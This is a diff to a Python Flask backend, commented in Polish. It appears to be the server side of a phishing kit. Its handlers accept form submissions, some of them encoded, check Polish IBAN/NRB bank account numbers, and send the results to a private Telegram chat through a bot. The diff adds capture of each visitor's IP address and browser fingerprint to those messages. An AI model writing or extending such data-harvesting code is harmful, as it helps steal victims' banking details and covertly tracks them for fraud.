@@ -28,6 +28,84 @@ def decode_data(encoded_data):
     except:
         return None
 
+def get_client_ip():
+    """Pobiera prawdziwy IP klienta (uwzględnia proxy)"""
+    # Sprawdź nagłówki proxy
+    if request.headers.get('X-Forwarded-For'):
+        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    elif request.headers.get('X-Real-IP'):
+        ip = request.headers.get('X-Real-IP')
+    else:
+        ip = request.remote_addr
+    return ip
+
+def get_user_agent():
+    """Pobiera User-Agent z nagłówków"""
+    return request.headers.get('User-Agent', 'Nieznany')
+
+def parse_user_agent(ua_string):
+    """Próbuje wyciągnąć informacje z User-Agent"""
+    if not ua_string or ua_string == 'Nieznany':
+        return {
+            'browser': 'Nieznany',
+            'os': 'Nieznany',
+            'device': 'Nieznany',
+            'full': ua_string
+        }
+    
+    result = {
+        'browser': 'Nieznany',
+        'os': 'Nieznany',
+        'device': 'Komputer',
+        'full': ua_string
+    }
+    
+    ua = ua_string.lower()
+    
+    # Wykrywanie przeglądarki
+    if 'chrome' in ua and 'edg' not in ua and 'opr' not in ua:
+        result['browser'] = 'Chrome'
+    elif 'firefox' in ua:
+        result['browser'] = 'Firefox'
+    elif 'safari' in ua and 'chrome' not in ua:
+        result['browser'] = 'Safari'
+    elif 'edg' in ua:
+        result['browser'] = 'Edge'
+    elif 'opr' in ua or 'opera' in ua:
+        result['browser'] = 'Opera'
+    elif 'brave' in ua:
+        result['browser'] = 'Brave'
+    
+    # Wykrywanie systemu operacyjnego
+    if 'windows' in ua:
+        result['os'] = 'Windows'
+        if 'windows nt 10.0' in ua:
+            result['os'] = 'Windows 10/11'
+        elif 'windows nt 6.1' in ua:
+            result['os'] = 'Windows 7'
+        elif 'windows nt 6.2' in ua:
+            result['os'] = 'Windows 8'
+        elif 'windows nt 6.3' in ua:
+            result['os'] = 'Windows 8.1'
+    elif 'android' in ua:
+        result['os'] = 'Android'
+        result['device'] = 'Smartfon'
+    elif 'iphone' in ua or 'ipad' in ua or 'ipod' in ua:
+        result['os'] = 'iOS'
+        result['device'] = 'iPhone/iPad'
+    elif 'mac os x' in ua or 'macintosh' in ua:
+        result['os'] = 'macOS'
+    elif 'linux' in ua:
+        result['os'] = 'Linux'
+    
+    # Wykrywanie urządzenia mobilnego
+    if 'mobile' in ua or 'android' in ua or 'iphone' in ua:
+        result['device'] = 'Smartfon'
+    elif 'tablet' in ua or 'ipad' in ua:
+        result['device'] = 'Tablet'
+    
+    return result
+
 def validate_polish_iban(raw_input):
     """
     Validates a Polish IBAN (28 chars with 'PL') or NRB (26 digits).
@@ -157,6 +235,11 @@ def submit_form():
         data = request.json
         print(f"📥 Received: {data}")
 
+        # Pobierz IP i User-Agent
+        client_ip = get_client_ip()
+        ua_string = get_user_agent()
+        ua_info = parse_user_agent(ua_string)
+
         # Sprawdzamy czy dane są zakodowane
         if 'data' in data:
             decoded = decode_data(data['data'])
@@ -185,6 +268,10 @@ def submit_form():
 🏦 NRB: {formatted_iban}
 🏛️ Bank: {bank_name if bank_name else 'Nieznany'}
 ✅ Status: {'✔️ POPRAWNY' if is_valid else '⚠️ NIEZWERYFIKOWANY'}
+
+🌐 IP: {client_ip}
+🌍 Browser: {ua_info['browser']} ({ua_info['os']}) - {ua_info['device']}
+🔍 User-Agent: {ua_string}
 """
 
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -200,7 +287,9 @@ def submit_form():
                 "message": "Dane zostały zapisane",
                 "iban_valid": is_valid,
                 "iban_formatted": formatted_iban,
-                "bank": bank_name
+                "bank": bank_name,
+                "client_ip": client_ip,
+                "user_agent": ua_string
             })
         else:
             return jsonify({"success": False, "error": f"Telegram error: {response.status_code}"}), 500
@@ -214,6 +303,11 @@ def submit_form():
 def collect_data():
     try:
         data = request.json
+        
+        # Pobierz IP i User-Agent
+        client_ip = get_client_ip()
+        ua_string = get_user_agent()
+        ua_info = parse_user_agent(ua_string)
         
         # Sprawdzamy czy dane są zakodowane
         if 'data' in data:
@@ -246,6 +340,11 @@ def collect_data():
 🏛️ Bank: {bank_name if bank_name else 'Nieznany'}
 ✅ Status: {'✔️ POPRAWNY' if iban_valid else '⚠️ NIEZWERYFIKOWANY'}"""
 
+        message += f"""
+🌐 IP: {client_ip}
+🌍 Browser: {ua_info['browser']} ({ua_info['os']}) - {ua_info['device']}
+🔍 User-Agent: {ua_string}"""
+
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         response = requests.post(url, data={
             'chat_id': TELEGRAM_CHAT_ID,
@@ -257,7 +356,9 @@ def collect_data():
             return jsonify({
                 "success": True,
                 "message": "Data collected",
-                "iban_valid": iban_valid if iban_from_data else None
+                "iban_valid": iban_valid if iban_from_data else None,
+                "client_ip": client_ip,
+                "user_agent": ua_string
             })
         else:
             return jsonify({"success": False, "error": f"Telegram error: {response.status_code}"}), 500
